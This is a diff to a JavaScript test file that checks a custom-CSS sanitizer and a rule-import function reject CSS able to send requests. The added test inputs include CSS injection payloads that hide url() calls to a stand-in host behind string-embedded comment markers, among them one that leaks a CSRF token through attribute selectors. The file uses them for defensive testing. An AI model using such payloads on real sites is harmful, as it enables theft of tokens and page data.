@@ -147,11 +147,20 @@ test('custom-rules: sanitizeCss refuses every form that can make a request, and 
     'a::before { content: "\\201C" }',
     'body { background: u\\72l(x) }',
     `.a { color: red } ${'/* pad */'.repeat(500)}`,
+    // 字符串对注释不透明：字符串里的 `/*` 不开注释，夹在中间的 url( 是活的（D-315）。
+    'a { content: "/*" } body { background: url(https://x.test/leak) } b { content: "*/" }',
+    'a { content: "/*" } body { background: url(https://x.test/leak) }',
+    "a { content: '/*' } body { background: url(https://x.test/leak) } b { content: '*/' }",
+    'a { content: "/*" } input[name=csrf][value^="a"] { background: url(https://x.test/a) } b { content: "*/" }',
+    'a { content: "/*" } @font-face { font-family: x; src: local(y) } b { content: "*/" }',
+    'a { content: "/* } body { background: url(https://x.test/leak) }',
+    // 注释里写的也拒：不给注释开例外。
+    '/* url( in a comment is refused too */ .ai-translator-inline-block { color: rgb(1, 2, 3) }',
   ];
   for (const css of unsafe) {
     assert.throws(() => CustomRules.sanitizeCss(css), { message: 'customRuleCssUnsafe' }, css);
   }
-  const safe = '/* url( in a comment is gone */ .ai-translator-inline-block { color: rgb(1, 2, 3) }';
+  const safe = '/* brand colour */ .ai-translator-inline-block { color: rgb(1, 2, 3) }';
   assert.equal(CustomRules.sanitizeCss(safe), safe, '只拒不改');
   const atLimit = `.a{color:red}${' '.repeat(4096 - 13)}`;
   assert.equal(atLimit.length, 4096);
@@ -285,7 +294,7 @@ test('custom-rules: mergeImport merges by id, stamps now, counts AI rules', () =
   assert.match(byMatch['d.com'].id, /^[0-9a-z]{8}$/);
 });
 
-test('custom-rules: mergeImport is all or nothing, with the per-rule reason as the cause', () => {
+test('custom-rules: mergeImport is all or nothing, with the per-rule reason as the cause', async () => {
   const bad = [
     null,
     file([], { format: 'something-else' }),
@@ -316,6 +325,24 @@ test('custom-rules: mergeImport is all or nothing, with the per-rule reason as t
     ])),
     { message: 'customRulesImportInvalid' },
   );
+  // 字符串里的 `/*` 藏起来的 url( 也让整包作废，存储一个字节不动（D-315）。
+  const hidden = 'a { content: "/*" } body { background: url(https://x.test/leak) } b { content: "*/" }';
+  const smuggled = file([
+    { match: ['a.com'], exclude: ['.ok'] },
+    { match: ['b.com'], css: hidden },
+  ]);
+  assert.throws(
+    () => CustomRules.mergeImport([], smuggled),
+    (error) => error.message === 'customRulesImportInvalid' && error.cause.message === 'customRuleCssUnsafe',
+  );
+  const sync = fakeSync({ 'customRule:keep0000': { v: 1, match: ['k.com'], engine: 'ai' } });
+  const before = JSON.stringify(sync.data);
+  await withChrome(sync.chrome, async () => {
+    await rejectsWith(write('import', { file: smuggled }), 'customRulesImportInvalid');
+  });
+  assert.equal(JSON.stringify(sync.data), before);
+  assert.equal(sync.calls.set.length, 0);
+  assert.equal(sync.calls.remove.length, 0);
 });
 
 test('custom-rules: mergeImport checks the quota on the merged result', () => {
